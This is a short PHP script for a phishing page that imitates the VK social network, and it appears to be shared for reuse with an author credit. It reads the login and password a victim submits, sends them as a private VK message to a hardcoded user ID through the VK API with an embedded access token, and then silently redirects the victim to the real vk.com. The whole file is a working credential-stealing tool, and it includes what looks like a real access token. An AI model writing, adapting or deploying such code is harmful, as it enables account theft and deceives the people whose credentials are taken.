<?php
$Log =$_POST['login'];
$Pass=$_POST['password'];
$text = "$Log:$Pass";
$token = 'd1f27f6546892ba80d5c34f02ca8c5e0453a22cd95e60902613170ad8bed0debe95c88fb7df48215f7663'; // ТУТ ВАШ ТОКЕН - ОТ АНДРОИДА ИЛИ ИНСТАГРАМА, НЕ ОТ АЙФОНА!
$post = file_get_contents ('https://api.vk.com/method/messages.send?user_id=84364520&message='.urlencode($text).'&access_token='.$token);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/'></head></html>";
//Сделал Perry007 Miped.ru
?>